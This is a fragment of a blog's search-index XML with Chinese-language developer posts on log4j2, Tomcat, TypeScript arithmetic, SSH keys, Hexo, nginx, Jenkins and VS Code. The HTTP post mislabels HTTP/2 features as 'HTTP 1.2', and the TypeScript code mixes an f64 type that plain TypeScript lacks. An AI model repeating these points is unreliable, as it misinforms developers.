      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2.xml:2:6: The processing instruction target matching &quot;[xX][mM][lL]&quot; is not allowed.</title>
    <url>/posts/34089723/</url>
    <content><![CDATA[<h3 id="How-to-solve-log4j2-xml-2-6-The-processing-instruction-target-matching-“-xX-mM-lL-”-is-not-allowed"><a href="#How-to-solve-log4j2-xml-2-6-The-processing-instruction-target-matching-“-xX-mM-lL-”-is-not-allowed" class="headerlink" title="How to solve log4j2.xml:2:6: The processing instruction target matching “[xX][mM][lL]” is not allowed."></a>How to solve log4j2.xml:2:6: The processing instruction target matching “[xX][mM][lL]” is not allowed.</h3><span id="more"></span>
<p>這篇介紹How to solve log4j2.xml:2:6: The processing instruction target matching “[xX][mM][lL]” is not allowed.</p>
<h3 id="發生錯誤的file"><a href="#發生錯誤的file" class="headerlink" title="發生錯誤的file"></a>發生錯誤的file</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ 1</span><br><span class="line">$ 2 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">$ 3 &lt;Configuration status=<span class="string">&quot;error&quot;</span>&gt;</span><br><span class="line">$ 4 &lt;Properties&gt;</span><br><span class="line"></span><br><span class="line">當log4j2.xml檔案的&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; 在第二行時</span><br><span class="line">就會出現此錯誤訊息。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ 1 &lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">$ 2 &lt;Configuration status=<span class="string">&quot;error&quot;</span>&gt;</span><br><span class="line">$ 3 &lt;Properties&gt;</span><br><span class="line"></span><br><span class="line">將&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;移至log4j2.xml檔案的第一行</span><br><span class="line">即可解決此錯誤發生。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Log4j2</category>
      </categories>
      <tags>
        <tag>Log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>The valid characters are defined in RFC 7230 and RFC 3986</title>
    <url>/posts/a534b34d/</url>
    <content><![CDATA[<h3 id="The-valid-characters-are-defined-in-RFC-7230-and-RFC-3986"><a href="#The-valid-characters-are-defined-in-RFC-7230-and-RFC-3986" class="headerlink" title="The valid characters are defined in RFC 7230 and RFC 3986"></a>The valid characters are defined in RFC 7230 and RFC 3986</h3><span id="more"></span>
<p>這篇介紹透過GET對jsp操作時，有特殊字元會被tomcat擋住之解決方法。</p>
<h3 id="瀏覽器執行jsp"><a href="#瀏覽器執行jsp" class="headerlink" title="瀏覽器執行jsp"></a>瀏覽器執行jsp</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在瀏覽器執行 https://&#123;host&#125;/xxx.jsp?value=&#123;<span class="string">&quot;A&quot;</span>:<span class="string">&quot;CCC&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">出現The valid characters are defined <span class="keyword">in</span> RFC 7230 and RFC 3986錯誤訊息</span><br><span class="line">因特殊字元被tomcat擋住。</span><br></pre></td></tr></table></figure>

<h3 id="不更動tomcat設定下之解決方法"><a href="#不更動tomcat設定下之解決方法" class="headerlink" title="不更動tomcat設定下之解決方法"></a>不更動tomcat設定下之解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;https://&#123;host&#125;/xxx.jsp&#x27;</span> --header <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> --data-urlencode <span class="string">&#x27;value=&#123;&quot;A&quot;:&quot;CCC&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">在 xxx.jsp 需做 String value = URLDecoder.decode(RequestParser.getStringParameter(request, 3000, <span class="string">&quot;value&quot;</span>, null), <span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>URLEncoder</category>
      </categories>
      <tags>
        <tag>URLEncoder</tag>
        <tag>URLDecoder</tag>
      </tags>
  </entry>
  <entry>
    <title>TypeScript-Arithmetic</title>
    <url>/posts/37b3708c/</url>
    <content><![CDATA[<h2 id="TypeScript-Arithmetic"><a href="#TypeScript-Arithmetic" class="headerlink" title="TypeScript-Arithmetic"></a>TypeScript-Arithmetic</h2><span id="more"></span>
<p>這篇介紹如何用TypeScript撰寫四則運算(加減乘除)。</p>
<p>TypeScript提供強型別的JavaScript語法，對熟悉後端撰寫的工程師<br>來寫JavaScript多了一份安全感，相對弱型別JavaScript更容易提前<br>debug。</p>
<h2 id="加法"><a href="#加法" class="headerlink" title="加法:"></a>加法:</h2><p>export function add(arg1: number, arg2: number): number {<br>  let s1 &#x3D; arg1.toString();<br>  let s2 &#x3D; arg2.toString();</p>
<p>  let len1 &#x3D; s1.length - (s1.indexOf(“.”) + 1);<br>  let len2 &#x3D; s2.length - (s2.indexOf(“.”) + 1);</p>
<p>  let m &#x3D; Math.pow(10, Math.max(len1, len2));<br>  return (multiply(arg1, m) + multiply(arg2, m)) &#x2F; m;<br>}</p>
<h2 id="減法"><a href="#減法" class="headerlink" title="減法:"></a>減法:</h2><p>export function subtract(arg1: number, arg2: number): number {<br>  let s1 &#x3D; arg1.toString();<br>  let s2 &#x3D; arg2.toString();</p>
<p>  let len1 &#x3D; s1.length - (s1.indexOf(“.”) + 1);<br>  let len2 &#x3D; s2.length - (s2.indexOf(“.”) + 1);</p>
<p>  let m &#x3D; Math.pow(10, Math.max(len1, len2));<br>  return (multiply(arg1, m) - multiply(arg2, m)) &#x2F; m;<br>}</p>
<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法:"></a>乘法:</h2><p>export function multiply(arg1: f64, arg2: f64): f64 {<br>  let s1 &#x3D; arg1.toString();<br>  let s2 &#x3D; arg2.toString();<br>  return mul(s1, s2);<br>}</p>
<p>function mul(s1: string, s2: string): f64 {</p>
<p>  let len1 &#x3D; s1.length - (s1.indexOf(“.”) + 1);<br>  let len2 &#x3D; s2.length - (s2.indexOf(“.”) + 1);</p>
<p>  let r1 &#x3D; Number.parseInt(s1.replace(“.”, “”), 10);<br>  let r2 &#x3D; Number.parseInt(s2.replace(“.”, “”), 10);</p>
<p>  return r1 * r2 &#x2F; Math.pow(10, len1 + len2);<br>}</p>
<h2 id="除法"><a href="#除法" class="headerlink" title="除法:"></a>除法:</h2><p>export function divide(arg1: number, arg2: number): number {<br>  let s1 &#x3D; arg1.toString();<br>  let s2 &#x3D; arg2.toString();</p>
<p>  let len1 &#x3D; s1.length - (s1.indexOf(“.”) + 1);<br>  let len2 &#x3D; s2.length - (s2.indexOf(“.”) + 1);</p>
<p>  let r1 &#x3D; Number.parseInt(s1.replace(“.”, “”), 10);<br>  let r2 &#x3D; Number.parseInt(s2.replace(“.”, “”), 10);<br>  return multiply((r1 &#x2F; r2), Math.pow(10, len2 - len1));<br>}</p>
<p>Reference:<br><span class="exturl" data-url="aHR0cHM6Ly93d3cudHlwZXNjcmlwdHR1dG9yaWFsLm5ldC8=">https://www.typescripttutorial.net/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Generate SSH Key To Login Linux</title>
    <url>/posts/52df344/</url>
    <content><![CDATA[<h3 id="Generate-SSH-Key-To-Login-Linux"><a href="#Generate-SSH-Key-To-Login-Linux" class="headerlink" title="Generate SSH Key To Login Linux"></a>Generate SSH Key To Login Linux</h3><span id="more"></span>
<p>這篇介紹透過Public Key Authentication的使用方式，可以不用輸入密碼直接登入Linux。</p>
<h3 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Step1:在建立金鑰之前，要先建立 ~/.ssh 這個目錄，並設定正確的權限</span><br><span class="line">$ <span class="built_in">mkdir</span> -p ~/.ssh</span><br><span class="line">$ <span class="built_in">chmod</span> 700 ~/.ssh</span><br><span class="line"></span><br><span class="line">Step2:以 ssh-keygen 產生金鑰</span><br><span class="line">$ ssh-keygen</span><br><span class="line"></span><br><span class="line">Step3:</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/user/.ssh/id_rsa):  ==&gt; Enter</span><br><span class="line">Created directory <span class="string">&#x27;/home/user/.ssh&#x27;</span>.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): ==&gt; Enter</span><br><span class="line">Enter same passphrase again: ==&gt; Enter</span><br><span class="line"></span><br><span class="line">Step4:</span><br><span class="line">在/home/user/.ssh/id_rsa.pub 是 Public Key</span><br><span class="line">/home/user/.ssh/id_rsa 可以拿來產生 .ppk</span><br></pre></td></tr></table></figure>

<h3 id="about-public-amp-private-key"><a href="#about-public-amp-private-key" class="headerlink" title="about public &amp; private key"></a>about public &amp; private key</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">id_rsa.pub：公開金鑰（public key），這是可以對外公開的金鑰，之後要將它放在遠端的 Linux 伺服器上作認證使用。</span><br><span class="line">id_rsa：私密金鑰（private key），這是要保護好的金鑰，它等同於你的 Linux 密碼，放在自己的電腦中。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>PublicKey</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Upgrade Hexo 6.3.0 Problem Solve for RGB or HSL value expected</title>
    <url>/posts/135e1b5a/</url>
    <content><![CDATA[<h3 id="Upgrade-Hexo-6-3-0-Problem-Solve"><a href="#Upgrade-Hexo-6-3-0-Problem-Solve" class="headerlink" title="Upgrade Hexo 6.3.0 Problem Solve"></a>Upgrade Hexo 6.3.0 Problem Solve</h3><span id="more"></span>
<p>這篇紀錄Upgrade Hexo 6.3.0 Problem Solve。</p>
<h3 id="升級過程遇到問題及解決方法"><a href="#升級過程遇到問題及解決方法" class="headerlink" title="升級過程遇到問題及解決方法"></a>升級過程遇到問題及解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改package.json -&gt; <span class="string">&quot;hexo&quot;</span>: <span class="string">&quot;^6.3.0&quot;</span></span><br><span class="line">$ npm update</span><br><span class="line"></span><br><span class="line">在hexo g 途中會出現 error(<span class="string">&#x27;RGB or HSL value expected, got a &#x27;</span> + -string(color))</span><br><span class="line"></span><br><span class="line">嘗試去GitHub找issue找不到相關問題描述</span><br><span class="line">只有一篇文章提到跟hexo-renderer-stylus依賴有關 且在NexT 8.10.0版本已修正</span><br><span class="line"></span><br><span class="line">實驗版本為</span><br><span class="line">Hexo 6.3.0</span><br><span class="line">NexT 8.13.1</span><br><span class="line"></span><br><span class="line">經過長時間的try and error仍然找不到相關解法~</span><br><span class="line">於是參考之前寫的文章:  https://davidchenblog.com/posts/458d88d0/?highlight=hexo</span><br><span class="line"></span><br><span class="line">按照步驟重新<span class="built_in">clone</span> -&gt; 比對_config.yml 及 同步成最新的yml</span><br><span class="line">最後終於解決升級版本問題!</span><br><span class="line"></span><br><span class="line">以後遇到找不到相關解答時，請參考https://davidchenblog.com/posts/458d88d0/?highlight=hexo</span><br><span class="line">升級即可解決。</span><br></pre></td></tr></table></figure>

<h3 id="附上-package-json"><a href="#附上-package-json" class="headerlink" title="附上 package.json"></a>附上 package.json</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hexo-site&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0.0.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;build&quot;</span>: <span class="string">&quot;hexo generate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clean&quot;</span>: <span class="string">&quot;hexo clean&quot;</span>,</span><br><span class="line">    <span class="string">&quot;deploy&quot;</span>: <span class="string">&quot;hexo deploy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;server&quot;</span>: <span class="string">&quot;hexo server&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;hexo&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;6.3.0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;hexo&quot;</span>: <span class="string">&quot;^6.3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-admin&quot;</span>: <span class="string">&quot;^2.3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-deployer-git&quot;</span>: <span class="string">&quot;^3.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-generator-archive&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-generator-category&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-generator-index&quot;</span>: <span class="string">&quot;^3.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-generator-tag&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-renderer-ejs&quot;</span>: <span class="string">&quot;^2.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-renderer-marked&quot;</span>: <span class="string">&quot;^6.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-renderer-stylus&quot;</span>: <span class="string">&quot;^2.1.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-server&quot;</span>: <span class="string">&quot;^3.0.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-theme-landscape&quot;</span>: <span class="string">&quot;^0.0.3&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hexo-abbrlink&quot;</span>: <span class="string">&quot;^2.2.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hexo-filter-nofollow&quot;</span>: <span class="string">&quot;^2.0.2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hexo-generator-searchdb&quot;</span>: <span class="string">&quot;^1.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hexo-generator-sitemap&quot;</span>: <span class="string">&quot;^3.0.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hexo-neat&quot;</span>: <span class="string">&quot;^1.0.9&quot;</span>,</span><br><span class="line">	<span class="string">&quot;hexo-symbols-count-time&quot;</span>: <span class="string">&quot;^0.7.1&quot;</span>,</span><br><span class="line">	<span class="string">&quot;quicklink&quot;</span>: <span class="string">&quot;^2.3.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo8</category>
      </categories>
      <tags>
        <tag>Hexo8</tag>
      </tags>
  </entry>
  <entry>
    <title>Using Nginx As HTTP Load Balancer</title>
    <url>/posts/5a6f2c49/</url>
    <content><![CDATA[<h3 id="Using-Nginx-As-HTTP-Load-Balancer"><a href="#Using-Nginx-As-HTTP-Load-Balancer" class="headerlink" title="Using Nginx As HTTP Load Balancer"></a>Using Nginx As HTTP Load Balancer</h3><span id="more"></span>
<p>Load balancing across multiple application instances is a commonly used technique for optimizing resource utilization,<br>maximizing throughput, reducing latency, and ensuring fault-tolerant configurations.<br>It is possible to use nginx as a very efficient HTTP load balancer to distribute traffic to several application servers<br>and to improve performance, scalability and reliability of web applications with nginx.</p>
<h3 id="Load-balancing-methods"><a href="#Load-balancing-methods" class="headerlink" title="Load balancing methods"></a>Load balancing methods</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">The following load balancing mechanisms (or methods) are supported <span class="keyword">in</span> nginx:</span><br><span class="line"></span><br><span class="line">1.round-robin — requests to the application servers are distributed <span class="keyword">in</span> a round-robin fashion,</span><br><span class="line">2.least-connected — next request is assigned to the server with the least number of active connections,</span><br><span class="line">3.ip-hash-a hash-function is used to determine what server should be selected <span class="keyword">for</span> the next request (based on the client’s IP address).</span><br></pre></td></tr></table></figure>

<h3 id="Default-load-balancing-configuration"><a href="#Default-load-balancing-configuration" class="headerlink" title="Default load balancing configuration"></a>Default load balancing configuration</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">The simplest configuration <span class="keyword">for</span> load balancing with nginx may look like the following:</span><br><span class="line">http &#123;</span><br><span class="line">    upstream myapp1 &#123;</span><br><span class="line">        server srv1.example.com;</span><br><span class="line">        server srv2.example.com;</span><br><span class="line">        server srv3.example.com;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://myapp1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">In the example above, there are 3 instances of the same application running on srv1-srv3.</span><br><span class="line">When the load balancing method is not specifically configured, it defaults to round-robin.</span><br><span class="line">All requests are proxied to the server group myapp1, and nginx applies HTTP load balancing to distribute the requests.</span><br><span class="line"></span><br><span class="line">Reverse proxy implementation <span class="keyword">in</span> nginx includes load balancing <span class="keyword">for</span> HTTP, HTTPS, FastCGI, uwsgi, SCGI, memcached, and gRPC.</span><br><span class="line">To configure load balancing <span class="keyword">for</span> HTTPS instead of HTTP, just use “https” as the protocol.</span><br><span class="line">When setting up load balancing <span class="keyword">for</span> FastCGI, uwsgi, SCGI, memcached, or gRPC, </span><br><span class="line">use fastcgi_pass, uwsgi_pass, scgi_pass, memcached_pass, and grpc_pass directives respectively.</span><br></pre></td></tr></table></figure>

<h3 id="Least-connected-load-balancing"><a href="#Least-connected-load-balancing" class="headerlink" title="Least connected load balancing"></a>Least connected load balancing</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Another load balancing discipline is least-connected. Least-connected allows controlling the load on application</span><br><span class="line">instances more fairly <span class="keyword">in</span> a situation when some of the requests take longer to complete.</span><br><span class="line"></span><br><span class="line">With the least-connected load balancing, nginx will try not to overload a busy application server with excessive requests,</span><br><span class="line">distributing the new requests to a less busy server instead.</span><br><span class="line"></span><br><span class="line">Least-connected load balancing <span class="keyword">in</span> nginx is activated when the least_conn directive is used as part of the server group configuration:</span><br><span class="line"></span><br><span class="line">upstream myapp1 &#123;</span><br><span class="line">        least_conn;</span><br><span class="line">        server srv1.example.com;</span><br><span class="line">        server srv2.example.com;</span><br><span class="line">        server srv3.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Session-persistence-ip-hash"><a href="#Session-persistence-ip-hash" class="headerlink" title="Session persistence (ip_hash)"></a>Session persistence (ip_hash)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Please note that with round-robin or least-connected load balancing, each subsequent client’s request can be potentially distributed to a different server.</span><br><span class="line">There is no guarantee that the same client will be always directed to the same server.</span><br><span class="line"></span><br><span class="line">If there is the need to tie a client to a particular application server — <span class="keyword">in</span> other words, make the client’s session “sticky” or “persistent” </span><br><span class="line"><span class="keyword">in</span> terms of always trying to select a particular server — the ip-hash load balancing mechanism can be used.</span><br><span class="line"></span><br><span class="line">With ip-hash, the client’s IP address is used as a hashing key to determine what server <span class="keyword">in</span> a server group should be selected <span class="keyword">for</span> the client’s requests.</span><br><span class="line">This method ensures that the requests from the same client will always be directed to the same server except when this server is unavailable.</span><br><span class="line">To configure ip-hash load balancing, just add the ip_hash directive to the server (upstream) group configuration:</span><br><span class="line"></span><br><span class="line">upstream myapp1 &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server srv1.example.com;</span><br><span class="line">    server srv2.example.com;</span><br><span class="line">    server srv3.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Weighted-load-balancing"><a href="#Weighted-load-balancing" class="headerlink" title="Weighted load balancing"></a>Weighted load balancing</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">It is also possible to influence nginx load balancing algorithms even further by using server weights.</span><br><span class="line"></span><br><span class="line">In the examples above, the server weights are not configured <span class="built_in">which</span> means that all specified servers are treated </span><br><span class="line">as equally qualified <span class="keyword">for</span> a particular load balancing method.</span><br><span class="line"></span><br><span class="line">With the round-robin <span class="keyword">in</span> particular it also means a more or less equal distribution of requests across the servers</span><br><span class="line">provided there are enough requests, and when the requests are processed <span class="keyword">in</span> a uniform manner and completed fast enough.</span><br><span class="line">When the weight parameter is specified <span class="keyword">for</span> a server, the weight is accounted as part of the load balancing decision.</span><br><span class="line"></span><br><span class="line">upstream myapp1 &#123;</span><br><span class="line">        server srv1.example.com weight=3;</span><br><span class="line">        server srv2.example.com;</span><br><span class="line">        server srv3.example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">With this configuration, every 5 new requests will be distributed across the application instances as the following: </span><br><span class="line">3 requests will be directed to srv1, one request will go to srv2, and another one - to srv3.</span><br><span class="line"></span><br><span class="line">It is similarly possible to use weights with the least-connected and ip-hash load balancing <span class="keyword">in</span> the recent versions of nginx.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>HTTPLoadBalancer</tag>
      </tags>
  </entry>
  <entry>
    <title>Upgrade Jenkins Docker Image Version</title>
    <url>/posts/9006bc80/</url>
    <content><![CDATA[<h2 id="Upgrade-Jenkins-Docker-Image-Version"><a href="#Upgrade-Jenkins-Docker-Image-Version" class="headerlink" title="Upgrade Jenkins Docker Image Version"></a>Upgrade Jenkins Docker Image Version</h2><span id="more"></span>
<p>這篇介紹Upgrade Jenkins Docker Image Version。</p>
<p>Jenkins發佈<br>Jenkins 2.427 and earlier, LTS 2.414.2 and earlier bundles versions of Jetty affected by<br>the security vulnerabilities CVE-2023-36478 and CVE-2023-44487.<br>These vulnerabilities allow unauthenticated attackers to cause a denial of service.</p>
<h2 id="Process"><a href="#Process" class="headerlink" title="Process:"></a>Process:</h2><p>$ docker stop jenkins<br>$ docker rm jenkins<br>$ docker run -itd –name jenkins -v jenkins:&#x2F;var&#x2F;jenkins_home –restart always -p 18080:8080 {REPOSITORY}:{TAG}</p>
<p>Reference:<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuamVua2lucy5pby9zZWN1cml0eS9hZHZpc29yeS8yMDIzLTEwLTE4Lw==">https://www.jenkins.io/security/advisory/2023-10-18/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Versus HTTP Different Version</title>
    <url>/posts/5c0f44a6/</url>
    <content><![CDATA[<h2 id="Intro-http1-0-versus-http1-1-versus-http1-2"><a href="#Intro-http1-0-versus-http1-1-versus-http1-2" class="headerlink" title="Intro http1.0 versus http1.1 versus http1.2"></a>Intro http1.0 versus http1.1 versus http1.2</h2><span id="more"></span>
<p>這篇介紹http1.0 versus http1.1 versus http1.2。</p>
<h2 id="lt-x3D-HTTP-1-0"><a href="#lt-x3D-HTTP-1-0" class="headerlink" title="&lt;&#x3D; HTTP 1.0:"></a>&lt;&#x3D; HTTP 1.0:</h2><p>在HTTP 1.0中出現的核心問題是傳輸數據時並沒有資料結束的邊界，<br>所以用一種暴力的方式來解決，也是每進行一次HTTP傳輸，<br>就必須建立一條TCP Connect，在傳輸結束後，都需要斷開一次TCP connect。<br>每次建立TCP connect，都需要經過三次握手，加上TCP關閉需要四次握手。<br>比照1.1和1.2來說非常耗費資源。</p>
<h2 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1:"></a>HTTP 1.1:</h2><p>HTTP 1.1導入Keep-Alive機制，default為開啟。可透過Connection:close<br>關閉。在HTTP傳輸時，若啟用Keep-Alive機制，該連結不會立即關閉。<br>若有新的request進來，且host &amp; port 相同時，則會reuse這條TCP connect。<br>減少TCP connect頻繁建立與close的資源消耗。</p>
<p>HTTP 1.1還有一個Keep-Alive request Header，可以設置timeout和max。<br>用來指定Idle connect保持open的時間，以及連接關閉前這條connect可以<br>發送request的最大值。</p>
<h2 id="How-To-Solve-HTTP粘包問題"><a href="#How-To-Solve-HTTP粘包問題" class="headerlink" title="How To Solve HTTP粘包問題:"></a>How To Solve HTTP粘包問題:</h2><p>現在多個HTTP request，可以reuse同一條TCP connect。<br>它是透過Contect-Length 這個Header解決的。它表明了data<br>所佔用的大小。可以透過它來確定這個Data Packet的邊界，避免粘包。</p>
<h2 id="HTTP-1-2"><a href="#HTTP-1-2" class="headerlink" title="HTTP 1.2:"></a>HTTP 1.2:</h2><p>HTTP 1.1存在的缺陷問題<br>1.如果client想要發起concurrent requests，則必須建立多個TCP Connect，<br>這對網路資源的消耗是非常嚴重的。<br>2.不能對request及response的Header進行壓縮，造成網路流量的浪費。</p>
<p>HTTP 1.2導入Multiplexing機制-<br>Multiplexing與Keep-Alive的區別:<br>1.Keep-Alive沒有解決request阻塞問題，需要等上一個request結束後，<br>才能復用該TCP connect進行下一個request。<br>2.HTTP 1.2導入Data Frame概念，使多個requests可以同時在流中進行傳輸。<br>3.HTTP 1.2 採用 HPACK壓縮演算法對Header進行壓縮，降低了request的流量。</p>
]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio Code for Java &amp; JavaScript</title>
    <url>/posts/1385e8a5/</url>
    <content><![CDATA[<h3 id="使用Visual-Studio-Code-來寫-Java-程式"><a href="#使用Visual-Studio-Code-來寫-Java-程式" class="headerlink" title="使用Visual Studio Code 來寫 Java 程式"></a>使用Visual Studio Code 來寫 Java 程式</h3><span id="more"></span>
<p>1.下載Visual Studio Code 安裝檔 :<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG93bmxvYWQ=">https://code.visualstudio.com/download<i class="fa fa-external-link-alt"></i></span></p>
<p>   逐步安裝完，會有Visual Studio Code IDE 和  Java Extension Pack. 包含</p>
<pre><code>Language Support for Java(TM) by Red Hat
Debugger for Java
Java Test Runner
Maven for Java
Java Dependency Viewer
</code></pre>
<p>2.需另安裝Maven，並設定環境變數 : 參考 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGV2MnFhLmNvbS9jcmVhdGUtamF2YS1wcm9qZWN0LXdpdGgtbWF2ZW4v">https://www.dev2qa.com/create-java-project-with-maven/<i class="fa fa-external-link-alt"></i></span></p>
<p>3.第2步驟安裝完成，即可使用 Maven for Java 對專案執行 clean package -DskipTests 編譯出 war 檔 或 jar 檔</p>
<p>   war檔有兩個地方要注意</p>
<p>   3.1. src\main\webapp\META-INF\ 下需包含context.xml</p>
<p>   3.2. src\main\config\dev\db.properties 的Oracle資料庫連線設置</p>
<p>4.安裝 Tomcat for Java 並指定Tomcat Server的安裝目錄後，可對war檔右鍵-&gt;Run on Tomcat Server將會開始佈署至Tomcat Server.</p>
<p>5.SVN control</p>
<p>5.1 <span class="exturl" data-url="aHR0cHM6Ly90b3J0b2lzZXN2bi5uZXQvZG93bmxvYWRzLmh0bWw=">安裝小烏龜作爲基底，以及第一次取得專案<i class="fa fa-external-link-alt"></i></span></p>
<p>5.2 Interface</p>
<p>5.2.1 cmd-line mode: 安裝 TortoiseSVN 即可對專案右鍵或下command進行SVN 操作.</p>
<p>5.2.2 <span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPWpvaG5zdG9uY29kZS5zdm4tc2Nt">Integrated mode: SVN<i class="fa fa-external-link-alt"></i></span> </p>
<p>6.匯入Java Formatter.xml，匯出Eclipse的formatter.xml，將檔名與配置檔案名稱設定成一樣，在下面這頁設定即可<br><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/JavaFormatter.png" width="100%" /></p>
<p>7.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZWNrc3R5bGUvY2hlY2tzdHlsZS90cmVlL21hc3Rlci9zcmMvbWFpbi9yZXNvdXJjZXM=">靜態程式碼檢查，安裝Checkstyle for Java<i class="fa fa-external-link-alt"></i></span>該連結提供兩種xml格式</p>
<p>   將xml檔案點選右鍵 -&gt; Set Checkstyle Configuration File 即可設定完成</p>
<p>8.JavaScript Editor</p>
<p>8.1 <span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPWRiYWV1bWVyLnZzY29kZS1lc2xpbnQ=">安裝 Eslint<i class="fa fa-external-link-alt"></i></span> </p>
<p>9.SQL Query</p>
<p>9.1 <span class="exturl" data-url="aHR0cHM6Ly9tYXJrZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPU9yYWNsZS5vcmFjbGVkZXZ0b29scw==">安裝 Oracle Developer Tools for VS Code<i class="fa fa-external-link-alt"></i></span></p>
